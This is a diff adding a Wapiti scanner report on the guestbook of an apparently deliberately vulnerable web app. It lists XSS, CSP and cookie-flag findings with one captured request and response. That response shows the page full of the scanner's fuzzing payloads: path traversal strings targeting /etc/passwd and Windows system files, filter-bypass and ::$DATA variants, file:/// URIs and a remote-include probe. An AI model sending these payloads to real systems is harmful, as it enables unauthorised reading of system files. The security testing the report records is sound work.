@@ -1,0 +1,2923 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Wapiti scan report</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="css/kube.min.css" />
+    <link rel="stylesheet" type="text/css" href="css/master.css" />
+</head>
+<body>
+    <div id="page">
+        <header style="text-align: center">
+        <h2 class="title" style="text-align: center">Wapiti vulnerability report</h2>
+        <h3>Target: http://web/guestbook.php</h3>
+        <p>Date of the scan: Wed, 20 Mar 2024 14:22:45 +0000. Scope of the scan: folder. Crawled pages: 3</p>
+        </header>
+        <hr />
+
+        <h4>Summary</h4>
+        <table class="width-100 hovered" style="background: url('logo_clear.png') no-repeat center;">
+            <thead>
+                <tr>
+                    <th>Category</th>
+                    <th>Number of vulnerabilities found</th>
+                </tr>
+            </thead>
+            <tbody id="summary">
+                    <tr>
+                        <td class="small">
+                            Backup file
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Weak credentials
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            CRLF Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_3">Content Security Policy Configuration</a>
+                        </td>
+                        <td class="small .text-centered">1</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Cross Site Request Forgery
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Potentially dangerous file
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Command execution
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Path Traversal
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Fingerprint web application framework
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Fingerprint web server
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Htaccess Bypass
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            HTML Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_12">HTTP Secure Headers</a>
+                        </td>
+                        <td class="small .text-centered">2</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_13">HttpOnly Flag cookie</a>
+                        </td>
+                        <td class="small .text-centered">1</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Unencrypted Channels
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Log4Shell
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Open Redirect
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_17">Reflected Cross Site Scripting</a>
+                        </td>
+                        <td class="small .text-centered">2</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_18">Secure Flag cookie</a>
+                        </td>
+                        <td class="small .text-centered">1</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Spring4Shell
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            SQL Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            TLS/SSL misconfigurations
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Server Side Request Forgery
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Stored HTML Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            <a href="#vuln_type_24">Stored Cross Site Scripting</a>
+                        </td>
+                        <td class="small .text-centered">6</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Subdomain takeover
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Blind SQL Injection
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Unrestricted File Upload
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            XML External Entity
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Internal Server Error
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Resource consumption
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Review Webserver Metafiles for Information Leakage
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            Fingerprint web technology
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+                    <tr>
+                        <td class="small">
+                            HTTP Methods
+                        </td>
+                        <td class="small .text-centered">0</td>
+                    </tr>
+            </tbody>
+        </table>
+        <hr />
+        <div id="details">
+                <h3 id="vuln_type_3">Content Security Policy Configuration</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.</dd>
+                </dl>
+
+                        <h4>🟡 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-3-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-3-0-2">HTTP Request</a>
+                                <a href="#tab-vuln-3-0-3">HTTP Response</a>
+                            <a href="#tab-vuln-3-0-4">cURL command line</a>
+                            <a href="#tab-vuln-3-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-3-0-1" style="min-height: 124px;">
+                            <pre>CSP is not set</pre>
+                        </section>
+                        <section id="tab-vuln-3-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    GET /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                            </pre>
+                        </section>
+                            <section id="tab-vuln-3-0-3" style="min-height: 124px;" class="is-hidden">
+                                <pre style="white-space: nowrap">
+                                    HTTP 200<br />
+                                            date: Wed, 20 Mar 2024 14:23:00 GMT<br />
+                                            server: Apache/2.4.57 (Debian)<br />
+                                            x-powered-by: PHP/8.2.10<br />
+                                            expires: Thu, 19 Nov 1981 08:52:00 GMT<br />
+                                            cache-control: no-store, no-cache, must-revalidate<br />
+                                            pragma: no-cache<br />
+                                            vary: Accept-Encoding<br />
+                                            content-length: 4795<br />
+                                            keep-alive: timeout=5, max=71<br />
+                                            connection: Keep-Alive<br />
+                                            content-type: text/html; charset=UTF-8<br />
+                                    <br />
+                                    
+
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/screen.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/print.css&#34; type=&#34;text/css&#34; media=&#34;print&#34;&gt;
+    &lt;!--[if IE]&gt;&lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/ie.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;&lt;![endif]--&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/stylings.css&#34; type=&#34;text/css&#34; media=&#34;screen&#34;&gt;
+    &lt;title&gt;WackoPicko.com&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div class=&#34;container &#34; style=&#34;border: 2px solid #5c95cf;&#34;&gt;
+      &lt;div class=&#34;column span-24 first last&#34;&gt;
+	&lt;h1 id=&#34;title&#34;&gt;&lt;a href=&#34;/&#34;&gt;WackoPicko.com&lt;/a&gt;&lt;/h1&gt;
+      &lt;/div&gt;
+      &lt;div id=&#34;menu&#34;&gt;
+	&lt;div class=&#34;column prepend-1 span-14 first&#34;&gt;
+	  &lt;ul class=&#34;menu&#34;&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/users/home.php&#34;&gt;&lt;span&gt;Home&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/upload.php&#34;&gt;&lt;span&gt;Upload&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/recent.php&#34;&gt;&lt;span&gt;Recent&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&#34;current&#34;&gt;&lt;a href=&#34;/guestbook.php&#34;&gt;&lt;span&gt;Guestbook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+	&lt;div class=&#34;column prepend-1 span-7 first last&#34;&gt;
+	  &lt;ul class=&#34;menu top_login&#34; &gt;
+      	    &lt;li&gt;&lt;a href=&#34;/users/login.php&#34;&gt;&lt;Span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+
+
+
+      &lt;div class=&#34;column span-24 first last&#34; id=&#34;search_bar_blue&#34;&gt;
+	&lt;div class=&#34;column prepend-17 span-7 first last&#34; id=&#34;search_box&#34;&gt;
+	  &lt;form action=&#34;/pictures/search.php&#34; method=&#34;get&#34; style=&#34;display:inline;&#34;&gt;
+	    &lt;input id=&#34;query2&#34; name=&#34;query&#34; size=&#34;15&#34; style=&#34;padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;&#34; type=&#34;text&#34; value=&#34;&#34;/&gt;
+	    &lt;input src=&#34;/images/search_button_white.gif&#34; type=&#34;image&#34; style=&#34;border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;&#34; /&gt;
+	  &lt;/form&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+   
+&lt;div class=&#34;column prepend-1 span-24 first last&#34;&gt;
+&lt;h2&gt;Guestbook&lt;/h2&gt;
+&lt;h4&gt;See what people are saying about us!&lt;/h4&gt;
+
+	&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;file:///etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;file://C:\Windows\System32\drivers\etc\services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;guestbook.php&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;guestbook.php &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;guestbook.php::$DATA&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by file://C:\Windows\System32\drivers\etc\services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by guestbook.php &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by guestbook.php  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by guestbook.php::$DATA &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh//e.php&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh//e.php &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:\Windows\System32\drivers\etc\services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:\Windows\System32\drivers\etc\services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:\Windows\System32\drivers\etc\services::$DATA&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:/Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:/Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:/Windows/System32/drivers/etc/services::$DATA&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../lib/&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../windows/&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../lib/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../windows/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default/../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by file:///etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
